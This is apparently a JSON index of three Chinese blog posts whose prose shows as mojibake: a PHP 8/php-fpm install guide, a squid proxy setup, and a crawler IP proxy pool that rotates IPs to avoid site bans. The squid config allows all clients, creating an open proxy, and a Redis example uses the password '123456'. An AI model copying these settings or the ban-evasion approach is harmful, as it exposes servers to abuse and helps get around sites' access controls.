[{"title":"php8.0å®‰è£…å’Œphp-fpm","url":"%2Fp%2Fad42ac48.html","content":"\n# 1. å®‰è£…\n\n### 1.1  ä¸‹è½½\n\nhttps://www.php.net/downloads  ä¸‹è½½php-8.0.0.tar.gz\n\n<!-- more -->\n\n### 1.2 å®‰è£…\n\n```bash\ntar zxvf php-8.0.0.tar.gz\n\n\nsudo apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev\n\n./configure --prefix=/usr/local/php  --enable-fpm\n\nmake && make  install\n\n\n# æœ€åå®‰è£…å¦‚ä¸‹\nInstalling shared extensions:     /usr/local/php/lib/php/extensions/no-debug-non-zts-20200930/\nInstalling PHP CLI binary:        /usr/local/php/bin/\nInstalling PHP CLI man page:      /usr/local/php/php/man/man1/\nInstalling PHP FPM binary:        /usr/local/php/sbin/\nInstalling PHP FPM defconfig:     /usr/local/php/etc/\nInstalling PHP FPM man page:      /usr/local/php/php/man/man8/\nInstalling PHP FPM status page:   /usr/local/php/php/php/fpm/\nInstalling phpdbg binary:         /usr/local/php/bin/\nInstalling phpdbg man page:       /usr/local/php/php/man/man1/\nInstalling PHP CGI binary:        /usr/local/php/bin/\nInstalling PHP CGI man page:      /usr/local/php/php/man/man1/\nInstalling build environment:     /usr/local/php/lib/php/build/\nInstalling header files:          /usr/local/php/include/php/\nInstalling helper programs:       /usr/local/php/bin/\n  program: phpize\n  program: php-config\nInstalling man pages:             /usr/local/php/php/man/man1/\n  page: phpize.1\n  page: php-config.1\n/root/workspace/php-8.0.0/build/shtool install -c ext/phar/phar.phar /usr/local/php/bin/phar.phar\nln -s -f phar.phar /usr/local/php/bin/phar\nInstalling PDO headers:           /usr/local/php/include/php/ext/pdo/\n\n\n# æŸ¥çœ‹ç‰ˆæœ¬\n/usr/local/php/bin/php -v \n```\n\n\n\n### 1.3 å¯åŠ¨ php-fpm\n\n```bash\ncd /usr/local/php/etc\ncp php-fpm.conf.default  php-fpm.conf\nvi php-fpm.conf   \nå»æ‰# pid = run/php-fpm.pid å‰é¢çš„æ³¨é‡Š\n\n\ncd /usr/local/php/etc/php-fpm.d\ncp www.conf.default  www.conf\n\n\n# æµ‹è¯•\n/usr/local/php/sbin/php-fpm -t\n\n# å¯åŠ¨\n/usr/local/php/sbin/php-fpm  # æŠ¥é”™ cannot get gid for group 'nobody'\ngroupadd nobody # å¢åŠ ç»„å³å¯\n```\n\n\n\n### 1.4 é…ç½®\n\n+ nginx é…ç½®\n\n` vi /etc/nginx/sites-enabled/php.conf`\n\n```nginx\nserver {\n        listen          80; \n        server_name  php.liuvv.com;\n        root   /var/www/html/php;\n        index  index.html index.htm index.php;\n\n        location ~ \\.php {\n                fastcgi_pass   127.0.0.1:9000;\n                fastcgi_index  index.php;\n                fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#               fastcgi_split_path_info ^(.+\\.php)(/.*)$;\n#               fastcgi_param PATH_INFO $fastcgi_path_info;\n                include        fastcgi_params;\n        }   \n}\n```\n\n+ å¢åŠ  php æ–‡ä»¶\n\n```bash\n mkdir /var/www/html/php\n vi /var/www/html/php/index.php\n <? phpinfo();\n```\n\n\n\n# 2. fastcgiå’Œphp-fpm\n\n### 2.1 CGIåè®®\n\nCGIå…¨ç§°æ˜¯â€œå…¬å…±ç½‘å…³æ¥å£â€(Common Gateway Interface)ï¼ŒHTTPæœåŠ¡å™¨ä¸ä½ çš„æˆ–å…¶å®ƒæœºå™¨ä¸Šçš„ç¨‹åºè¿›è¡Œâ€œäº¤è°ˆâ€çš„ä¸€ç§å·¥å…·ï¼Œå…¶ç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šã€‚\n\nCGIå¯ä»¥ç”¨ä»»ä½•ä¸€ç§è¯­è¨€ç¼–å†™ï¼Œåªè¦è¿™ç§è¯­è¨€å…·æœ‰æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œç¯å¢ƒå˜é‡ã€‚å¦‚php,perl,tclç­‰ã€‚\n\nå½“Nginxæ”¶åˆ°`/index.php`è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„CGIç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ã€‚web serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚\n\n\n\n### 2.2 FastCGIåè®®\n\nFastCGIåƒæ˜¯ä¸€ä¸ªå¸¸é©»(long-live)å‹çš„CGIï¼Œå®ƒå¯ä»¥ä¸€ç›´æ‰§è¡Œç€ï¼Œåªè¦æ¿€æ´»åï¼Œä¸ä¼šæ¯æ¬¡éƒ½è¦èŠ±è´¹æ—¶é—´å»forkä¸€æ¬¡ï¼ˆè¿™æ˜¯CGIæœ€ä¸ºäººè¯Ÿç—…çš„fork-and-execute æ¨¡å¼ï¼‰ã€‚å®ƒè¿˜æ”¯æŒåˆ†å¸ƒå¼çš„è¿ç®—ï¼Œå³ FastCGI ç¨‹åºå¯ä»¥åœ¨ç½‘ç«™æœåŠ¡å™¨ä»¥å¤–çš„ä¸»æœºä¸Šæ‰§è¡Œå¹¶ä¸”æ¥å—æ¥è‡ªå…¶å®ƒç½‘ç«™æœåŠ¡å™¨æ¥çš„è¯·æ±‚ã€‚\n\nFastCGIæ˜¯è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„CGIå¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°†CGIè§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­å¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒCGIè§£é‡Šå™¨çš„åå¤åŠ è½½æ˜¯CGIæ€§èƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ï¼Œå¦‚æœCGIè§£é‡Šå™¨ä¿æŒåœ¨å†…å­˜ä¸­å¹¶æ¥å—FastCGIè¿›ç¨‹ç®¡ç†å™¨è°ƒåº¦ï¼Œåˆ™å¯ä»¥æä¾›è‰¯å¥½çš„æ€§èƒ½ã€ä¼¸ç¼©æ€§ã€Fail- Overç‰¹æ€§ç­‰ç­‰ã€‚\n\n\n\nFastCGIçš„ç‰¹ç‚¹æ˜¯ä¼šåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä¾æ¬¡å®Œæˆå¤šä¸ªè¯·æ±‚ï¼Œä»¥è¾¾åˆ°æé«˜æ•ˆç‡çš„ç›®çš„ï¼Œå¤§å¤šæ•°FastCGIå®ç°éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªè¿›ç¨‹æ± ã€‚\n\n\n\n### 2.3 PHP-CGIè§£é‡Šå™¨\n\nPHP-CGIæ˜¯PHPè‡ªå¸¦çš„FastCGIç®¡ç†å™¨ã€‚\n\nPHP-CGIçš„ä¸è¶³ï¼š\n\n1. php-cgiå˜æ›´php.inié…ç½®åéœ€é‡å¯php-cgiæ‰èƒ½è®©æ–°çš„php-iniç”Ÿæ•ˆï¼Œä¸å¯ä»¥å¹³æ»‘é‡å¯ã€‚\n2. ç›´æ¥æ€æ­»php-cgiè¿›ç¨‹ï¼Œphpå°±ä¸èƒ½è¿è¡Œäº†ã€‚\n\nPHP-CGIåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†ã€‚æ‰€ä»¥å°±å‡ºç°äº†ä¸€äº›èƒ½å¤Ÿè°ƒåº¦ php-cgi è¿›ç¨‹çš„ç¨‹åºï¼Œæ¯”å¦‚è¯´ç”±lighthttpdåˆ†ç¦»å‡ºæ¥çš„spawn-fcgiã€‚åŒæ ·ï¼ŒPHP-FPMä¹Ÿæ˜¯ç”¨äºè°ƒåº¦ç®¡ç†PHPè§£æå™¨php-cgiçš„ç®¡ç†ç¨‹åºã€‚\n\n\n\n### 2.4 PHP-FPMè°ƒåº¦PHP-CGI\n\nPHPçš„è§£é‡Šå™¨æ˜¯php-cgiã€‚php-cgiåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†ï¼ˆçš‡ä¸Šï¼Œè‡£å¦¾çœŸçš„åšä¸åˆ°å•Šï¼ï¼‰\n\næ‰€ä»¥å°±å‡ºç°äº†ä¸€äº›èƒ½å¤Ÿè°ƒåº¦php-cgiè¿›ç¨‹çš„ç¨‹åºï¼Œæ¯”å¦‚è¯´ç”±lighthttpdåˆ†ç¦»å‡ºæ¥çš„spawn-fcgiã€‚PHP-FPMä¹Ÿæ˜¯ç”¨äºè°ƒåº¦ç®¡ç†PHPè§£æå™¨php-cgiçš„ç®¡ç†ç¨‹åºã€‚\n\n\n\n### 2.5 é—®é¢˜å›ç­”\n\n+ fastcgiæ˜¯ä¸€ä¸ªåè®®ï¼Œphp-fpmå®ç°äº†è¿™ä¸ªåè®®ï¼› \n\n  å¯¹ã€‚\n\n+ æœ‰çš„è¯´ï¼Œphp-fpmæ˜¯fastcgiè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œç”¨æ¥ç®¡ç†fastcgiè¿›ç¨‹çš„ï¼› \n\n  å¯¹ã€‚\n\n  php-fpmçš„ç®¡ç†å¯¹è±¡æ˜¯php-cgiã€‚ä½†ä¸èƒ½è¯´php-fpmæ˜¯fastcgiè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œfastcgiæ˜¯ä¸ªåè®®ï¼Œä¼¼ä¹æ²¡æœ‰è¿™ä¹ˆä¸ªè¿›ç¨‹å­˜åœ¨ï¼Œå°±ç®—å­˜åœ¨php-fpmä¹Ÿç®¡ç†ä¸äº†ä»–ï¼ˆè‡³å°‘ç›®å‰æ˜¯ï¼‰ã€‚\n\n+ æœ‰çš„è¯´ï¼Œphp-fpmæ˜¯phpå†…æ ¸çš„ä¸€ä¸ªè¡¥ä¸; \n\n  ä»¥å‰æ˜¯å¯¹çš„ã€‚\n\n  å› ä¸ºæœ€å¼€å§‹çš„æ—¶å€™php-fpmæ²¡æœ‰åŒ…å«åœ¨PHPå†…æ ¸é‡Œé¢ï¼Œè¦ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œéœ€è¦æ‰¾åˆ°ä¸æºç ç‰ˆæœ¬ç›¸åŒçš„php-fpmå¯¹å†…æ ¸æ‰“è¡¥ä¸ï¼Œç„¶åå†ç¼–è¯‘ã€‚åæ¥PHPå†…æ ¸é›†æˆäº†PHP-FPMä¹‹åå°±æ–¹ä¾¿å¤šäº†ï¼Œä½¿ç”¨--enalbe-fpmè¿™ä¸ªç¼–è¯‘å‚æ•°å³å¯ã€‚\n\n+ æœ‰çš„è¯´ï¼Œä¿®æ”¹äº†php.inié…ç½®æ–‡ä»¶åï¼Œæ²¡åŠæ³•å¹³æ»‘é‡å¯ï¼Œæ‰€ä»¥å°±è¯ç”Ÿäº†php-fpmï¼› \n\n  æ˜¯çš„ã€‚\n  ä¿®æ”¹php.iniä¹‹åï¼Œphp-cgiè¿›ç¨‹çš„ç¡®æ˜¯æ²¡åŠæ³•å¹³æ»‘é‡å¯çš„ã€‚php-fpmå¯¹æ­¤çš„å¤„ç†æœºåˆ¶æ˜¯æ–°çš„workerç”¨æ–°çš„é…ç½®ï¼Œå·²ç»å­˜åœ¨çš„workerå¤„ç†å®Œæ‰‹ä¸Šçš„æ´»å°±å¯ä»¥æ­‡ç€äº†ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶æ¥å¹³æ»‘è¿‡åº¦ã€‚\n\n+ è¿˜æœ‰çš„è¯´php-cgiæ˜¯PHPè‡ªå¸¦çš„FastCGIç®¡ç†å™¨ï¼Œé‚£è¿™æ ·çš„è¯å¹²å—åˆå¼„ä¸ªphp-fpmå‡ºæ¥ï¼›\n\n  php-cgiä¸php-fpmä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªfastcgiè¿›ç¨‹ç®¡ç†å™¨\n\n  php-cgiçš„é—®é¢˜åœ¨äº 1ã€php-cgiå˜æ›´php.inié…ç½®åéœ€é‡å¯php-cgiæ‰èƒ½è®©æ–°çš„php-iniç”Ÿæ•ˆï¼Œä¸å¯ä»¥å¹³æ»‘é‡å¯ 2ã€ç›´æ¥æ€æ­»php-cgiè¿›ç¨‹,phpå°±ä¸èƒ½è¿è¡Œäº†ã€‚(PHP-FPMå’ŒSpawn-FCGIå°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜,å®ˆæŠ¤è¿›ç¨‹ä¼šå¹³æ»‘ä»æ–°ç”Ÿæˆæ–°çš„å­è¿›ç¨‹ã€‚ï¼‰ é’ˆå¯¹php-cgiçš„ä¸è¶³ï¼Œphp-fpmåº”è¿è€Œç”Ÿã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/7627c794b272\n\n+ https://segmentfault.com/q/1010000000256516\n\n","tags":["php"],"categories":["php"]},{"title":"squidä»£ç†ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F94837db0.html","content":"\nçˆ¬è™«ç©å¾—å¥½ï¼Œç‰¢é¥­åƒåˆ°é¥±ã€‚\n\nç›®å‰å…è´¹çš„ä»£ç†æ± å‡ ä¹ä¸èƒ½ç”¨, ç¨³å®šçš„ä»£ç†æ± æ”¶è´¹åˆæ¯”è¾ƒé«˜ã€‚è¶ç€åŒåä¸€æ’¸äº†å‡ å°ä¾¿å®œçš„äº‘æœåŠ¡å™¨, ç›´æ¥æ‹¿æ¥å½“ä»£ç†æœåŠ¡å™¨ä½¿ç”¨äº†ã€‚\n\nsquidæœåŠ¡ç¨‹åºæ˜¯ä¸€æ¬¾åœ¨Unixç³»ç»Ÿä¸­æœ€ä¸ºæµè¡Œçš„é«˜æ€§èƒ½ä»£ç†æœåŠ¡è½¯ä»¶ï¼Œé€šå¸¸ä¼šè¢«å½“ä½œç½‘ç«™çš„å‰ç½®ç¼“å­˜æœåŠ¡ï¼Œç”¨äºæ›¿ä»£ç”¨æˆ·å‘ç½‘ç«™æœåŠ¡å™¨è¯·æ±‚é¡µé¢æ•°æ®å¹¶è¿›è¡Œç¼“å­˜ï¼Œé€šä¿—æ¥è®²ï¼ŒsquidæœåŠ¡ç¨‹åºä¼šæ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶åè‡ªåŠ¨å»ä¸‹è½½åˆ¶å®šæ•°æ®(å¦‚ç½‘é¡µ)å¹¶å­˜å‚¨åœ¨æœåŠ¡å™¨å†…ï¼Œå½“ä»¥åçš„ç”¨æˆ·å†æ¥è¯·æ±‚ç›¸åŒæ•°æ®æ—¶ï¼Œåˆ™ç›´æ¥å°†åˆšåˆšå­˜å‚¨åœ¨æœåŠ¡å™¨æœ¬åœ°çš„æ•°æ®äº¤ç»™ç”¨æˆ·ï¼Œè¾ƒå°‘ç”¨æˆ·çš„ç­‰å¾…æ—¶é—´ã€‚\n\n<!-- more -->\n\n# 1. squidä»£ç†åˆ†ç±»\n\n### 1.1 æ­£å‘ä»£ç†\n\næ­£å‘ä»£ç†è®©ç”¨æˆ·å¯ä»¥é€šè¿‡SquidæœåŠ¡ç¨‹åºè·å–ç½‘ç«™é¡µé¢çš„æ•°æ®ï¼Œå…·ä½“å·¥ä½œå½¢å¼åˆ†ä¸ºæ ‡å‡†ä»£ç†æ¨¡å¼ä¸é€æ˜ä»£ç†æ¨¡å¼ã€‚\n\n+ æ ‡å‡†æ­£å‘ä»£ç†æ¨¡å¼ï¼š\n\n  ç”¨æˆ·è®¿é—®ç½‘ç«™ï¼Œå…ˆåˆ°squidä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœsquidä»£ç†æœåŠ¡å™¨æœ‰æ•°æ®ï¼Œé‚£ä¹ˆsquidå°±ç›´æ¥ä»ç¼“å­˜ä¸­æ”¾å›ç»™ç”¨æˆ·ï¼Œå¦‚æœsquidç¼“å­˜ä¸­æ²¡æœ‰ï¼Œé‚£ä¹ˆsquidå°±ä»£æ›¿ç”¨æˆ·å»è®¿é—®ç½‘ç«™ï¼ŒæŠŠæ•°æ®è¿”å›çš„ç»™ç”¨æˆ·çš„åŒæ—¶ç•™ä¸€ä»½åˆ°ç¼“å­˜ä¸­ï¼Œä¸€éä¸‹æ¬¡ç”¨æˆ·ï¼ˆæˆ–è€…å…¶ä»–ç”¨æˆ·ï¼‰è®¿é—®çš„æ—¶å€™ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è¿”å›ç»™ç”¨æˆ·\n\n  \n\n+ é€æ˜æ­£å‘ä»£ç†æ¨¡å¼ï¼š\n\n  é€æ˜ä»£ç†ç¼“å†²æœåŠ¡å™¨å’Œæ ‡å‡†ä»£ç†æœåŠ¡å™¨çš„åŠŸèƒ½å®Œå…¨ç›¸åŒã€‚ç›¸å¯¹äºæ™®é€šä»£ç†æœåŠ¡è€Œè¨€ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦åšä»»ä½•å’Œä»£ç†æœåŠ¡å™¨ç›¸å…³çš„è®¾ç½®ï¼Œå¯¹ç”¨æˆ·è€Œè¨€ï¼Œæ„Ÿè§‰ä¸åˆ°ä»£ç†æœåŠ¡å™¨çš„å­˜åœ¨ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºé€æ˜ä»£ç†ã€‚\n\n  å³æŠŠä»£ç†æœåŠ¡å™¨éƒ¨ç½²åœ¨æ ¸å¿ƒçš„ä¸Šç½‘å‡ºå£ï¼Œå½“ç”¨æˆ·ä¸Šç½‘æµè§ˆé¡µé¢æ—¶ï¼Œä¼šäº¤ç»™ä»£ç†æœåŠ¡å™¨å‘å¤–è¯·æ±‚ï¼Œå¦‚æœç»“åˆiptableså¯ä»¥å®ç°ä»£ç†+ç½‘å…³+å†…å®¹è¿‡æ»¤+æµé‡å®‰å…¨æ§åˆ¶ç­‰å®Œæ•´çš„ä¸Šç½‘è§£å†³æ–¹æ¡ˆã€‚\n\n  \n\n### 1.2 åå‘ä»£ç†\n\nåå‘ä»£ç†æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»å†…éƒ¨æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–è¡¨ç°ä¸ºä¸€ä¸ªæœåŠ¡å™¨ã€‚\n\nsquidåšåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé€šå¸¸å·¥ä½œåœ¨ä¸€ä¸ªæœåŠ¡å™¨é›†ç¾¤çš„å‰ç«¯ï¼Œåœ¨ç”¨æˆ·çœ‹æ¥ï¼ŒsquidæœåŠ¡å™¨å°±æ˜¯ä»–æ‰€è¦è®¿é—®çš„æœåŠ¡å™¨ï¼Œè€Œå®é™…æ„ä¹‰ä¸Šï¼Œsquidåªæ˜¯æ¥å—ç”¨æˆ·çš„è¯·æ±‚ï¼ŒåŒæ—¶å°†ç”¨æˆ·è¯·æ±‚è½¬å‘ç»™å†…éƒ¨çœŸæ­£çš„WEBæœåŠ¡å™¨ï¼Œå¦‚æœsquidæœ¬èº«æœ‰ç”¨æˆ·è¦è®¿é—®çš„å†…å®¹ï¼Œåˆ™squidç›´æ¥å°†æ•°æ®è¿”å›ç»™ç”¨æˆ·ï¼Œèµ·åˆ°äº†ç¼“å­˜æ•°æ®çš„ä½œç”¨ï¼Œå‡å°‘äº†åç«¯æœåŠ¡å™¨çš„å‹åŠ›ã€‚\n\n\n\n### 1.3 åŒºåˆ«\n\n+ æ¦‚å¿µ\n\n  æ­£å‘ä»£ç†ï¼šå¯¹äºåŸå§‹æœåŠ¡å™¨è€Œè¨€ï¼Œå°±æ˜¯å®¢æˆ·ç«¯çš„ä»£è¨€äºº\n\n  åå‘ä»£ç†ï¼šå¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œå°±åƒæ˜¯åŸå§‹æœåŠ¡å™¨\n\n+ ç”¨é€”\n\n  æ­£å‘ä»£ç†çš„å…¸å‹ç”¨é€”æ˜¯ä¸ºåœ¨é˜²ç«å¢™å†…çš„å±€åŸŸç½‘å®¢æˆ·ç«¯æä¾›è®¿é—®Internetçš„é€”å¾„ã€‚æ­£å‘ä»£ç†è¿˜å¯ä»¥ä½¿ç”¨ç¼“å†²ç‰¹æ€§å‡å°‘ç½‘ç»œä½¿ç”¨ç‡ã€‚\n\n  åå‘ä»£ç†è¿˜å¯ä»¥ä¸ºåç«¯çš„å¤šå°æœåŠ¡å™¨æä¾›è´Ÿè½½å¹³è¡¡ï¼Œæˆ–ä¸ºåç«¯è¾ƒæ…¢çš„æœåŠ¡å™¨æä¾›ç¼“å†²æœåŠ¡ã€‚å¦å¤–ï¼Œåå‘ä»£ç†è¿˜å¯ä»¥å¯ç”¨é«˜çº§URLç­–ç•¥å’Œç®¡ç†æŠ€æœ¯ï¼Œä»è€Œä½¿å¤„äºä¸åŒwebæœåŠ¡å™¨ç³»ç»Ÿçš„webé¡µé¢åŒæ—¶å­˜åœ¨äºåŒä¸€ä¸ªURLç©ºé—´ä¸‹ã€‚\n\n+ å®‰å…¨æ€§\n\n  æ­£å‘ä»£ç†å…è®¸å®¢æˆ·ç«¯é€šè¿‡å®ƒè®¿é—®ä»»æ„ç½‘ç«™å¹¶ä¸”éšè—å®¢æˆ·ç«¯è‡ªèº«ï¼Œå› æ­¤ä½ å¿…é¡»é‡‡å–å®‰å…¨æªæ–½ä»¥ç¡®ä¿ä»…ä¸ºç»è¿‡æˆæƒçš„å®¢æˆ·ç«¯æä¾›æœåŠ¡ã€‚\n\n  åå‘ä»£ç†å¯¹å¤–éƒ½æ˜¯é€æ˜çš„ï¼Œè®¿é—®è€…å¹¶ä¸çŸ¥é“è‡ªå·±è®¿é—®çš„æ˜¯ä¸€ä¸ªä»£ç†ã€‚\n\n  \n\n# 2. å®‰è£…ä½¿ç”¨\n\n```bash\napt update\napt install -y squid\n```\n\n\n\n### 2.1 ä¿®æ”¹é…ç½®\n\n```bash\nvi /etc/squid/squid.conf\n\n# ä»£ç†æœåŠ¡å™¨ç«¯å£\nhttp_port 3128\n\n\n# ä¿®æ”¹é»˜è®¤å…è®¸ç­–ç•¥, æŠŠ deny æ¢æˆ allow\nhttp_access deny all\nhttp_access allow all\n```\n\nä¿®æ”¹å®Œé…ç½®ä»¥åé‡å¯: `systemctl restart squid`\n\n\n\n### 2.2 log é…ç½®\n\nsquidçš„æ—¥å¿—ä½äº/var/log/squid/ç›®å½•ä¸‹ã€‚\n\n```bash\ntail -f /var/log/squid/access.log\n```\n\nå¦‚æœæƒ³åœ¨logä¸ŠåŠ ä¸Šæ—¥æœŸ: \n\n```ini\nlogformat combined %>a %ui %un [%tl] \"%rm %ru HTTP/%rv\" %Hs %<st \"%{Referer}>h\" \"%{User-Agent}>h\" %Ss:%Sh %{host}>h\naccess_log daemon:/var/log/squid/access.log combined\n```\n\n\n\n### 2.3 å…è®¸ç‰¹å®š ip\n\nå…ˆå¢åŠ ä¸€ä¸ªè§„åˆ™, ç„¶åå…è®¸\n\n```ini\nacl specialIP src x.x.x.x\nhttp_access allow specialIP\n\n# ä¾‹å­\nacl papa src 1.1.1.1\nhttp_access allow papa\n```\n\n\n\n# 3. æ³¨æ„äº‹é¡¹\n\n### 3.1 æµè§ˆå™¨è®¾ç½®ä»£ç†è®¿é—®\n\nTODO:\n\n### 3.2 æµ‹è¯•demo\n\nå¦‚æœæ— æ³•è®¿é—®, è¯·æ£€æŸ¥æ˜¯å¦å¼€å¯é˜²ç«å¢™ç«¯å£\n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n  proxy, err := url.Parse(\"http://ä»£ç†ip:ä»£ç†ç«¯å£\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ http://blog.haoji.me/linux-squid-proxy.html\n+ https://www.cnblogs.com/bluestorm/p/9032086.html","tags":["squid"],"categories":["çˆ¬è™«"]},{"title":"çˆ¬è™«IPä»£ç†æ± ","url":"%2Fp%2F3020e4ad.html","content":"\n\n\nå¯¹äºçˆ¬è™«æ¥è¯´ï¼Œç”±äºçˆ¬è™«çˆ¬å–é€Ÿåº¦è¿‡å¿«ï¼Œåœ¨çˆ¬å–è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°åŒä¸€ä¸ªIPè®¿é—®è¿‡äºé¢‘ç¹çš„é—®é¢˜ï¼Œæ­¤æ—¶ç½‘ç«™å°±ä¼šè®©æˆ‘ä»¬è¾“å…¥éªŒè¯ç ç™»å½•æˆ–è€…ç›´æ¥å°é”IPï¼Œè¿™æ ·ä¼šç»™çˆ¬å–å¸¦æ¥æå¤§çš„ä¸ä¾¿ã€‚\n\nä½¿ç”¨ä»£ç†éšè—çœŸå®çš„IPï¼Œè®©æœåŠ¡å™¨è¯¯ä»¥ä¸ºæ˜¯ä»£ç†æœåŠ¡å™¨åœ¨è¯·æ±‚è‡ªå·±ã€‚è¿™æ ·åœ¨çˆ¬å–è¿‡ç¨‹ä¸­é€šè¿‡ä¸æ–­æ›´æ¢ä»£ç†ï¼Œå°±ä¸ä¼šè¢«å°é”ï¼Œå¯ä»¥è¾¾åˆ°å¾ˆå¥½çš„çˆ¬å–æ•ˆæœã€‚\n\n<!-- more -->\n\n\n\n# 1. å…è´¹ä»£ç†\n\nå…è´¹ä»£ç†å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯ä¸å¥½ç”¨çš„ï¼Œæ‰€ä»¥æ¯”è¾ƒé è°±çš„æ–¹æ³•æ˜¯è´­ä¹°ä»˜è´¹ä»£ç†ã€‚\n\n### 1.1 å¼€æºé¡¹ç›® proxy_pool\n\n##### 1.1.1 å®‰è£…å’Œå¯åŠ¨\n\n```Â bash\ndocker pull jhao104/proxy_pool\n\n#ä¾èµ–redis, æ‰€ä»¥è¦å…ˆå®‰è£… redis\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\ndocker run --env DB_CONN=redis://:123456@172.17.0.1:6379/1 -p 5010:5010 --name proxy_pool jhao104/proxy_pool:latest\n```\n\n\n\n#### 1.1.2 ä½¿ç”¨\n\ndocker å¯åŠ¨å, é€šè¿‡è®¿é—®æœ¬åœ°çš„æ¥å£, å°±å¯ä»¥å¾—åˆ° ip\n\n```\nhttp://127.0.0.1:5010/get/\n```\n\næˆ–è€…ç”¨ä½œè€…ç»™å‡ºçš„æµ‹è¯•åœ°å€: http://118.24.52.95/get/\n\n\n\n\n# 2. ä»˜è´¹ä»£ç†\n\n### 2.1 èŠéº»ä»£ç†\n\n+ http://h.zhimaruanjian.com/getapi/\n\n+ ç”Ÿæˆ API é“¾æ¥\n\n+ è°ƒç”¨ API è·å– IP å’Œç«¯å£(å¦‚æœæç¤ºåŠ å…¥ç™½åå•, ç”¨æ–‡æ¡£é‡Œçš„æ¥å£å³å¯)\n\n  \n\n# 3. ä»£ç \n\n### 3.1 golang \n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n\n  proxy, err := url.Parse(\"http://ä»£ç†ip:ä»£ç†ç«¯å£\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/5491.html\n+ https://github.com/jhao104/proxy_pool\n+ 